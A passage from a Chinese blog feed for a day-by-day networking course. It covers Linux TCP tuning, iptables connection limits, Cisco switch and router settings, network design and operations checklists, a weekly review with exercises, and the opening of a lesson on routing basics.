TIME_WAIT重用</span><br><span class="hljs-string">net</span>.<span class="hljs-string">ipv4</span>.<span class="hljs-string">tcp_tw_reuse</span> = <span class="hljs-string">1</span><br><span class="hljs-string">net</span>.<span class="hljs-string">ipv4</span>.<span class="hljs-string">tcp_fin_timeout</span> = <span class="hljs-string">30</span><br><br><span class="hljs-comment"># TCP KeepAlive</span><br><span class="hljs-string">net</span>.<span class="hljs-string">ipv4</span>.<span class="hljs-string">tcp_keepalive_time</span> = <span class="hljs-string">600</span><br><span class="hljs-string">net</span>.<span class="hljs-string">ipv4</span>.<span class="hljs-string">tcp_keepalive_probes</span> = <span class="hljs-string">3</span><br><span class="hljs-string">net</span>.<span class="hljs-string">ipv4</span>.<span class="hljs-string">tcp_keepalive_intvl</span> = <span class="hljs-string">15</span><br><br><span class="hljs-comment"># TCP快速打开</span><br><span class="hljs-string">net</span>.<span class="hljs-string">ipv4</span>.<span class="hljs-string">tcp_fastopen</span> = <span class="hljs-string">3</span><br><br><span class="hljs-comment"># 启用BBR拥塞控制</span><br><span class="hljs-string">net</span>.<span class="hljs-string">core</span>.<span class="hljs-string">default_qdisc</span> = <span class="hljs-string">fq</span><br><span class="hljs-string">net</span>.<span class="hljs-string">ipv4</span>.<span class="hljs-string">tcp_congestion_control</span> = <span class="hljs-string">bbr</span><br><br>应用配置：<br><span class="hljs-string">sudo</span> <span class="hljs-string">sysctl</span> -<span class="hljs-string">p</span><br><br><span class="hljs-string">2</span>. 防火墙优化<br><span class="hljs-comment"># 使用连接追踪限制</span><br><span class="hljs-string">iptables</span> -<span class="hljs-string">A</span> <span class="hljs-string">INPUT</span> -<span class="hljs-string">m</span> <span class="hljs-string">conntrack</span> <span class="hljs-built_in">--ctstate</span> <span class="hljs-string">ESTABLISHED</span>,<span class="hljs-string">RELATED</span> -<span class="hljs-string">j</span> <span class="hljs-string">ACCEPT</span><br><span class="hljs-string">iptables</span> -<span class="hljs-string">A</span> <span class="hljs-string">INPUT</span> -<span class="hljs-string">m</span> <span class="hljs-string">conntrack</span> <span class="hljs-built_in">--ctstate</span> <span class="hljs-string">INVALID</span> -<span class="hljs-string">j</span> <span class="hljs-string">DROP</span><br><br><span class="hljs-comment"># 限制新连接速率</span><br><span class="hljs-string">iptables</span> -<span class="hljs-string">A</span> <span class="hljs-string">INPUT</span> -<span class="hljs-string">p</span> <span class="hljs-string">tcp</span> <span class="hljs-built_in">--dport</span> <span class="hljs-string">80</span> -<span class="hljs-string">m</span> <span class="hljs-string">connlimit</span> <span class="hljs-built_in">--connlimit-above</span> <span class="hljs-string">20</span> -<span class="hljs-string">j</span> <span class="hljs-string">REJECT</span><br><br><span class="hljs-string">3</span>. 负载均衡<br><span class="hljs-comment"># 使用Nginx/HAProxy</span><br><span class="hljs-comment"># DNS轮询</span><br><span class="hljs-comment"># 硬件负载均衡器</span><br><br><span class="hljs-string">4</span>. <span class="hljs-string">CDN</span>加速<br><span class="hljs-comment"># 静态资源使用CDN</span><br><span class="hljs-comment"># 减少延迟</span><br><span class="hljs-comment"># 减轻服务器压力</span><br><br><span class="hljs-string">5</span>. 缓存策略<br><span class="hljs-comment"># Redis/Memcached</span><br><span class="hljs-comment"># 减少数据库查询</span><br><span class="hljs-comment"># 提高响应速度</span><br></code></pre></td></tr></table></figure><p><strong>网络设备优化</strong>：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-number">1.</span> 交换机优化<br><span class="hljs-meta"># 启用流控</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># flowcontrol send on</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># flowcontrol receive on</span><br><br><span class="hljs-meta"># QoS配置</span><br><span class="hljs-keyword">Switch</span>(config)<span class="hljs-meta"># mls qos</span><br><br><span class="hljs-meta"># 端口聚合（增加带宽）</span><br><span class="hljs-keyword">Switch</span>(config)<span class="hljs-meta"># interface port-channel 1</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># switchport mode trunk</span><br><br><span class="hljs-number">2.</span> 路由器优化<br><span class="hljs-meta"># 路由汇总（减少路由表）</span><br>Router(config-router)<span class="hljs-meta"># area 0 range 192.168.0.0 255.255.0.0</span><br><br><span class="hljs-meta"># 启用CEF（快速转发）</span><br>Router(config)<span class="hljs-meta"># ip cef</span><br><br><span class="hljs-meta"># 调整路由协议定时器</span><br>Router(config-router)<span class="hljs-meta"># timers basic 5 15 15 10</span><br><br><span class="hljs-number">3.</span> 无线网络优化<br><span class="hljs-meta"># 选择合适信道（避免干扰）</span><br><span class="hljs-meta"># 使用5GHz频段</span><br><span class="hljs-meta"># 启用802.11ac/ax</span><br><span class="hljs-meta"># 合理放置AP</span><br><span class="hljs-meta"># 调整发射功率</span><br></code></pre></td></tr></table></figure><hr><h2 id="5-最佳实践"><a href="#5-最佳实践" class="headerlink" title="5. 最佳实践"></a>5. 最佳实践</h2><h3 id="5-1-网络设计原则"><a href="#5-1-网络设计原则" class="headerlink" title="5.1 网络设计原则"></a>5.1 网络设计原则</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 层次化设计<br>   接入层 → 汇聚层 → 核心层<br><span class="hljs-bullet">   -</span> 清晰的层次<br><span class="hljs-bullet">   -</span> 易于管理<br><span class="hljs-bullet">   -</span> 易于扩展<br><br><span class="hljs-bullet">2.</span> 冗余和高可用<br><span class="hljs-bullet">   -</span> 双链路<br><span class="hljs-bullet">   -</span> 双设备<br><span class="hljs-bullet">   -</span> 双电源<br><span class="hljs-bullet">   -</span> 快速切换<br><br><span class="hljs-bullet">3.</span> 安全性<br><span class="hljs-bullet">   -</span> 访问控制（ACL）<br><span class="hljs-bullet">   -</span> 防火墙<br><span class="hljs-bullet">   -</span> IDS/IPS<br><span class="hljs-bullet">   -</span> 加密通信<br><br><span class="hljs-bullet">4.</span> 可扩展性<br><span class="hljs-bullet">   -</span> 预留地址空间<br><span class="hljs-bullet">   -</span> 模块化设计<br><span class="hljs-bullet">   -</span> 标准化配置<br><br><span class="hljs-bullet">5.</span> 性能<br><span class="hljs-bullet">   -</span> 合理带宽<br><span class="hljs-bullet">   -</span> QoS策略<br><span class="hljs-bullet">   -</span> 负载均衡<br><br><span class="hljs-bullet">6.</span> 可管理性<br><span class="hljs-bullet">   -</span> 集中管理<br><span class="hljs-bullet">   -</span> 监控告警<br><span class="hljs-bullet">   -</span> 日志记录<br><span class="hljs-bullet">   -</span> 文档完善<br></code></pre></td></tr></table></figure><h3 id="5-2-运维建议"><a href="#5-2-运维建议" class="headerlink" title="5.2 运维建议"></a>5.2 运维建议</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 日常维护<br>   ✅ 定期检查设备状态<br>   ✅ 监控网络流量<br>   ✅ 更新固件和补丁<br>   ✅ 备份配置<br>   ✅ 清理日志<br><br><span class="hljs-bullet">2.</span> 监控告警<br>   ✅ 流量异常告警<br>   ✅ 设备故障告警<br>   ✅ 性能下降告警<br>   ✅ 安全事件告警<br><br><span class="hljs-bullet">3.</span> 文档管理<br>   ✅ 网络拓扑图<br>   ✅ IP地址分配表<br>   ✅ 设备配置文档<br>   ✅ 故障处理记录<br>   ✅ 变更记录<br><br><span class="hljs-bullet">4.</span> 变更管理<br>   ✅ 变更前评估<br>   ✅ 变更计划<br>   ✅ 回滚方案<br>   ✅ 变更测试<br>   ✅ 变更记录<br><br><span class="hljs-bullet">5.</span> 应急响应<br>   ✅ 应急预案<br>   ✅ 联系清单<br>   ✅ 备用设备<br>   ✅ 快速恢复流程<br></code></pre></td></tr></table></figure><hr><h2 id="6-本周总结"><a href="#6-本周总结" class="headerlink" title="6. 本周总结"></a>6. 本周总结</h2><h3 id="6-1-学习成果"><a href="#6-1-学习成果" class="headerlink" title="6.1 学习成果"></a>6.1 学习成果</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">本周完成内容：</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Day 22</span><span class="hljs-punctuation">:</span> <span class="hljs-string">IP协议基础</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">IPv4地址和子网划分</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">IP数据包格式</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">NAT技术</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">实现IP地址计算器</span><br><br><span class="hljs-attribute">Day 23</span><span class="hljs-punctuation">:</span> <span class="hljs-string">IPv6详解</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">IPv6地址格式</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">IPv6特性和优势</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">IPv6过渡技术</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">实现IPv6地址工具</span><br><br><span class="hljs-attribute">Day 24</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ICMP和诊断工具</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">ICMP协议原理</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">ping和traceroute实现</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">网络诊断方法</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">实现诊断工具套件</span><br><br><span class="hljs-attribute">Day 25</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ARP协议和链路层</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">ARP工作原理</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">ARP安全问题</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">MAC地址和以太网</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">实现ARP工具</span><br><br><span class="hljs-attribute">Day 26</span><span class="hljs-punctuation">:</span> <span class="hljs-string">路由协议基础</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">路由表和路由查找</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">静态路由配置</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">RIP和OSPF协议</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">实现路由表模拟器</span><br><br><span class="hljs-attribute">Day 27</span><span class="hljs-punctuation">:</span> <span class="hljs-string">综合实战</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">知识点整合</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">实战项目</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">排错案例</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">性能优化</span><br></code></pre></td></tr></table></figure><h3 id="6-2-技能提升"><a href="#6-2-技能提升" class="headerlink" title="6.2 技能提升"></a>6.2 技能提升</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs markdown">掌握的技能：<br><br><span class="hljs-bullet">1.</span> 协议理解<br>   ✅ 深入理解网络层协议<br>   ✅ 掌握IP、ICMP、ARP<br>   ✅ 了解路由协议<br><br><span class="hljs-bullet">2.</span> 工具使用<br>   ✅ ping、traceroute<br>   ✅ arp、route<br>   ✅ tcpdump、wireshark<br>   ✅ ip、ifconfig<br><br><span class="hljs-bullet">3.</span> 编程能力<br>   ✅ 原始套接字编程<br>   ✅ 网络协议实现<br>   ✅ 数据包构造和解析<br><br><span class="hljs-bullet">4.</span> 排错能力<br>   ✅ 系统化排错方法<br>   ✅ 使用诊断工具<br>   ✅ 分析网络问题<br>   ✅ 提出解决方案<br><br><span class="hljs-bullet">5.</span> 优化能力<br>   ✅ 性能分析<br>   ✅ 参数调优<br>   ✅ 网络设计<br></code></pre></td></tr></table></figure><h3 id="6-3-下周预告"><a href="#6-3-下周预告" class="headerlink" title="6.3 下周预告"></a>6.3 下周预告</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">第五周：网络安全基础（Day 28-35）<br><br>主要内容：<br><span class="hljs-bullet">- </span>网络安全概述<br><span class="hljs-bullet">- </span>防火墙技术<br><span class="hljs-bullet">- </span>VPN和隧道<br><span class="hljs-bullet">- </span>入侵检测<br><span class="hljs-bullet">- </span>安全协议<br><span class="hljs-bullet">- </span>渗透测试基础<br><span class="hljs-bullet">- </span>安全加固<br><br>学习目标：<br><span class="hljs-bullet">- </span>理解网络安全威胁<br><span class="hljs-bullet">- </span>掌握防护技术<br><span class="hljs-bullet">- </span>学习安全工具<br><span class="hljs-bullet">- </span>实现安全项目<br></code></pre></td></tr></table></figure><hr><h2 id="7-今日练习"><a href="#7-今日练习" class="headerlink" title="7. 今日练习"></a>7. 今日练习</h2><h3 id="练习1：综合诊断"><a href="#练习1：综合诊断" class="headerlink" title="练习1：综合诊断"></a>练习1：综合诊断</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown">任务：诊断网络连接问题<br><br>场景：<br>某台电脑无法访问互联网<br><br>要求：<br><span class="hljs-bullet">1.</span> 使用系统化的方法排查<br><span class="hljs-bullet">2.</span> 记录每个步骤的结果<br><span class="hljs-bullet">3.</span> 找出问题原因<br><span class="hljs-bullet">4.</span> 提出解决方案<br><span class="hljs-bullet">5.</span> 验证解决效果<br><br>提交：<br><span class="hljs-bullet">-</span> 诊断过程文档<br><span class="hljs-bullet">-</span> 问题分析报告<br><span class="hljs-bullet">-</span> 解决方案说明<br></code></pre></td></tr></table></figure><h3 id="练习2：性能优化"><a href="#练习2：性能优化" class="headerlink" title="练习2：性能优化"></a>练习2：性能优化</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">任务：优化Linux服务器网络性能<br><br>要求：<br><span class="hljs-bullet">1.</span> 测试当前性能基线<br><span class="hljs-bullet">2.</span> 应用优化配置<br><span class="hljs-bullet">3.</span> 重新测试性能<br><span class="hljs-bullet">4.</span> 对比优化效果<br><span class="hljs-bullet">5.</span> 分析提升原因<br><br>测试项目：<br><span class="hljs-bullet">-</span> TCP连接建立速度<br><span class="hljs-bullet">-</span> 并发连接数<br><span class="hljs-bullet">-</span> 吞吐量<br><span class="hljs-bullet">-</span> 延迟<br><br>提交：<br><span class="hljs-bullet">-</span> 优化前后对比数据<br><span class="hljs-bullet">-</span> 优化配置文件<br><span class="hljs-bullet">-</span> 性能分析报告<br></code></pre></td></tr></table></figure><h3 id="练习3：实战项目"><a href="#练习3：实战项目" class="headerlink" title="练习3：实战项目"></a>练习3：实战项目</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">任务：实现网络诊断脚本<br><br>要求：<br><span class="hljs-bullet">1.</span> 整合本周所学工具<br><span class="hljs-bullet">2.</span> 实现自动诊断功能<br><span class="hljs-bullet">3.</span> 生成诊断报告<br><span class="hljs-bullet">4.</span> 提供解决建议<br><br>功能：<br><span class="hljs-bullet">-</span> 基础连通性测试<br><span class="hljs-bullet">-</span> DNS测试<br><span class="hljs-bullet">-</span> 路径追踪<br><span class="hljs-bullet">-</span> 性能测试<br><span class="hljs-bullet">-</span> 问题诊断<br><br>提交：<br><span class="hljs-bullet">-</span> 完整代码<br><span class="hljs-bullet">-</span> 使用文档<br><span class="hljs-bullet">-</span> 测试结果<br></code></pre></td></tr></table></figure><hr><h2 id="8-学习建议"><a href="#8-学习建议" class="headerlink" title="8. 学习建议"></a>8. 学习建议</h2><h3 id="8-1-复习重点"><a href="#8-1-复习重点" class="headerlink" title="8.1 复习重点"></a>8.1 复习重点</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs markdown">必须掌握：<br><span class="hljs-bullet">1.</span> IP地址和子网划分<br><span class="hljs-bullet">   -</span> 熟练计算子网<br><span class="hljs-bullet">   -</span> 理解CIDR和VLSM<br><br><span class="hljs-bullet">2.</span> 路由原理<br><span class="hljs-bullet">   -</span> 最长前缀匹配<br><span class="hljs-bullet">   -</span> 路由表查找<br><span class="hljs-bullet">   -</span> 静态和动态路由<br><br><span class="hljs-bullet">3.</span> ARP协议<br><span class="hljs-bullet">   -</span> 地址解析过程<br><span class="hljs-bullet">   -</span> ARP缓存管理<br><span class="hljs-bullet">   -</span> 安全问题<br><br><span class="hljs-bullet">4.</span> 网络诊断<br><span class="hljs-bullet">   -</span> ping和traceroute<br><span class="hljs-bullet">   -</span> 系统化排错方法<br><span class="hljs-bullet">   -</span> 工具使用<br><br>重点练习：<br><span class="hljs-bullet">-</span> 子网划分题目<br><span class="hljs-bullet">-</span> 路由查找练习<br><span class="hljs-bullet">-</span> 实际排错操作<br><span class="hljs-bullet">-</span> 编写诊断脚本<br></code></pre></td></tr></table></figure><h3 id="8-2-扩展学习"><a href="#8-2-扩展学习" class="headerlink" title="8.2 扩展学习"></a>8.2 扩展学习</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs markdown">深入学习：<br><span class="hljs-bullet">1.</span> 阅读RFC文档<br><span class="hljs-bullet">   -</span> RFC 791: IP<br><span class="hljs-bullet">   -</span> RFC 792: ICMP<br><span class="hljs-bullet">   -</span> RFC 826: ARP<br><span class="hljs-bullet">   -</span> RFC 2453: RIP<br><span class="hljs-bullet">   -</span> RFC 2328: OSPF<br><br><span class="hljs-bullet">2.</span> 网络模拟<br><span class="hljs-bullet">   -</span> GNS3<br><span class="hljs-bullet">   -</span> Packet Tracer<br><span class="hljs-bullet">   -</span> EVE-NG<br><br><span class="hljs-bullet">3.</span> 抓包分析<br><span class="hljs-bullet">   -</span> Wireshark深度使用<br><span class="hljs-bullet">   -</span> 协议分析<br><span class="hljs-bullet">   -</span> 流量分析<br><br><span class="hljs-bullet">4.</span> 网络编程<br><span class="hljs-bullet">   -</span> 套接字编程<br><span class="hljs-bullet">   -</span> 协议实现<br><span class="hljs-bullet">   -</span> 工具开发<br><br><span class="hljs-bullet">5.</span> 网络安全<br><span class="hljs-bullet">   -</span> 常见攻击<br><span class="hljs-bullet">   -</span> 防御技术<br><span class="hljs-bullet">   -</span> 渗透测试<br></code></pre></td></tr></table></figure><hr><h2 id="9-思考题"><a href="#9-思考题" class="headerlink" title="9. 思考题"></a>9. 思考题</h2><p><strong>Q1：为什么需要IPv6？IPv4地址不够用如何临时解决？</strong></p><p>思考方向：</p><ul><li>IPv4地址空间限制</li><li>NAT的作用和局限</li><li>IPv6的必要性</li><li>过渡方案</li></ul><p><strong>Q2：如何设计一个高可用的网络架构？</strong></p><p>思考方向：</p><ul><li>冗余设计</li><li>故障切换</li><li>负载均衡</li><li>监控告警</li></ul><p><strong>Q3：遇到网络故障，应该如何系统化排查？</strong></p><p>思考方向：</p><ul><li>分层排查（物理→链路→网络→传输→应用）</li><li>由近及远（本机→网关→外网）</li><li>使用合适工具</li><li>记录过程</li></ul><hr><h2 id="10-总结"><a href="#10-总结" class="headerlink" title="10. 总结"></a>10. 总结</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs armasm">第四周学习路径：<br><br>物理层 → 链路层 → 网络层<br>         ↓         ↓<br>       ARP      <span class="hljs-built_in">IP</span>/ICMP<br>                   ↓<br>                路由协议<br>                   ↓<br>              综合应用<br><br>核心能力：<br>✅ 协议理解<br>✅ 工具使用<br>✅ 编程实现<br>✅ 问题诊断<br>✅ 性能优化<br><br>学习心得：<br>网络层是TCP/<span class="hljs-built_in">IP</span>核心，理解了网络层，<br>就理解了互联网的工作原理。<br><br>从<span class="hljs-built_in">IP</span>寻址到路由转发，从ARP解析到ICMP诊断，<br>每个协议都有其独特作用，又相互配合。<br><br>理论要结合实践，通过编程实现和实际操作，<br>才能真正掌握这些知识。<br><br>继续加油！下周我们将学习网络安全！<br></code></pre></td></tr></table></figure><hr><p><strong>继续加油！</strong> 🚀</p><p><strong>进度：27&#x2F;180天（15.0%）</strong></p><p>恭喜完成第四周学习！你已经掌握了网络层的核心知识，建立了完整的网络协议体系。下周我们将进入激动人心的网络安全领域，学习如何保护网络免受攻击！</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>26天：路由协议基础</title>
    <link href="/2025/11/10/26%E5%A4%A9%EF%BC%9A%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/11/10/26%E5%A4%A9%EF%BC%9A%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="第26天：路由协议基础"><a href="#第26天：路由协议基础" class="headerlink" title="第26天：路由协议基础"></a>第26天：路由协议基础</h1><h2 id="今日目标"><a href="#今日目标" class="headerlink" title="今日目标"></a>今日目标</h2><ul><li>理解路由的基本概念</li><li>掌握路由表的结构和查找过程</li><li>学习静态路由配置</li><li>理解动态路由协议的分类</li><li>深入学习RIP协议</li><li>了解OSPF协议基础</li><li>实现路由表模拟器</li></ul><hr><h2 id="1-路由基础概念"><a href="#1-路由基础概念" class="headerlink" title="1. 路由基础概念"></a>1. 路由基础概念</h2><h3 id="1-1-什么是路由？"><a href="#1-1-什么是路由？" class="headerlink" title="1.1 什么是路由？"></a>1.1 什么是路由？</h3><p><strong>路由 &#x3D; Routing</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">路由的定义：<br>确定数据包从源到目的地的传输路径<br><br>生活比喻：<br>路由就像导航系统<br><br>场景：你要从北京到上海<br><span class="hljs-bullet">-</span> 可以坐飞机（快，贵）<br><span class="hljs-bullet">-</span> 可以坐高铁（较快，适中）<br><span class="hljs-bullet">-</span> 可以开车（灵活，慢）<br><br>路由器就是&quot;导航&quot;：<br><span class="hljs-bullet">-</span> 分析目的地<br><span class="hljs-bullet">-</span> 选择最佳路径<br><span class="hljs-bullet">-</span> 指引数据包前进<br><br>关键问题：<br><span class="hljs-bullet">1.</span> 去哪里？→ 目标网络<br><span class="hljs-bullet">2.</span> 怎么走？→ 下一跳<br><span class="hljs-bullet">3.</span> 有几条路？→ 多条路径<br><span class="hljs-bullet">4.</span> 哪条最好？→ 